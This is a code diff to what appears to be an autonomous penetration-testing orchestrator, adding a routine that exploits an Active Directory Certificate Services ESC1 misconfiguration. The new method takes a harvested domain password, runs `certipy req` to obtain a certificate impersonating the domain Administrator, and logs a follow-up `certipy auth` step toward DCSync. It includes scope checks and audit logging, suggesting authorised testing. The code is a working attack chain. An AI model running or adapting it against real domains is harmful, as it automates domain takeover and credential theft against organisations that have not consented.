@@ -252,10 +252,12 @@ class Orchestrator:
                 # An AD credential in hand -> autonomously roast for more hashes,
                 # then escalate through the session.
                 self._autonomous_kerberoast()
+                self._autonomous_adcs()
                 self._autonomous_privesc()
             elif phase == Phase.POST and self.auto_exploit:
                 # No session, but a domain credential may still let us roast.
                 self._autonomous_kerberoast()
+                self._autonomous_adcs()
                 await self.run_phase(max_steps=max_steps)
             else:
                 await self.run_phase(max_steps=max_steps)
@@ -344,6 +346,63 @@ class Orchestrator:
         if added:
             self.emit("note", f"Kerberoast recovered {added} hash(es); crack loop can attack them")
         self.state.save(self.state_path)
+
+    def _autonomous_adcs(self, *, runner=None) -> None:
+        """With a domain credential + a known DC + an ESC1 finding, run certipy req.
+
+        Fires the concrete `certipy req` command for the first ESC1 finding on
+        the state, targeting Administrator. Saves the .pfx artifact reference
+        and emits the `certipy auth` follow-up so a full DA cert-auth is one
+        step away. Scope-checked and audited; no-ops when preconditions miss.
+        """
+        import re as _re
+        dc = next((h for h in self.state.hosts.values() if "dc" in h.tags), None)
+        if dc is None or not self.validator.scope.allows(dc.address):
+            return
+        domain = next((t.split(":", 1)[1] for t in dc.tags
+                       if t.startswith("domain:")), "")
+        pw_creds = [c for c in self.state.credentials
+                    if c.kind == "password" and c.username and c.secret]
+        cred = next((c for c in pw_creds if c.validated), None) or \
+            (pw_creds[0] if pw_creds else None)
+        # First ESC1 finding still worth firing (title carries the template).
+        esc_f = next((f for f in self.state.findings
+                      if "ESC1" in (f.title or "")), None)
+        if not domain or cred is None or esc_f is None:
+            return
+        m = _re.search(r"template\s+(\S+)", esc_f.title or "", _re.IGNORECASE)
+        template = m.group(1) if m else "User"
+        # We don't know the CA name deterministically; use certipy's default resolver.
+        argv = ["certipy", "req",
+                "-u", f"{cred.username}@{domain}",
+                "-p", cred.secret or "",
+                "-dc-ip", dc.address, "-target", dc.address,
+                "-template", template,
+                "-upn", f"administrator@{domain}"]
+        self.emit("run", f"autonomous ADCS ESC1: certipy req template={template}")
+        self.audit.write("adcs_req", host=dc.address, template=template,
+                         user=cred.username, domain=domain)
+        runner = runner or _subprocess_runner
+        code, out, err = runner(argv, 240)
+        text = (out or "") + "\n" + (err or "")
+        got_pfx = ("Saved certificate" in text or ".pfx" in text or
+                   "administrator.pfx" in text)
+        if got_pfx:
+            self.emit("finding", "[critical] ADCS ESC1 landed - administrator.pfx saved")
+            self.state.add_finding(Finding(
+                title="ADCS ESC1 exploitation successful",
+                severity=Severity.CRITICAL, host=dc.address,
+                description="certipy req returned a certificate authenticating "
+                            "as administrator@" + domain + ". Run "
+                            "`certipy auth -pfx administrator.pfx` for the "
+                            "NT hash / TGT and DCSync.",
+                evidence=text[:400],
+                exploit="certipy auth -pfx administrator.pfx",
+                validation="confirmed",
+                proof=f"cert issued via {template} for administrator@{domain}"))
+            self.state.save(self.state_path)
+        else:
+            self.emit("note", "certipy req did not return a certificate")
 
     def _autonomous_privesc_windows(self) -> None:
         """Windows counterpart of the autonomous privesc: WinRM enum + curated escalation."""
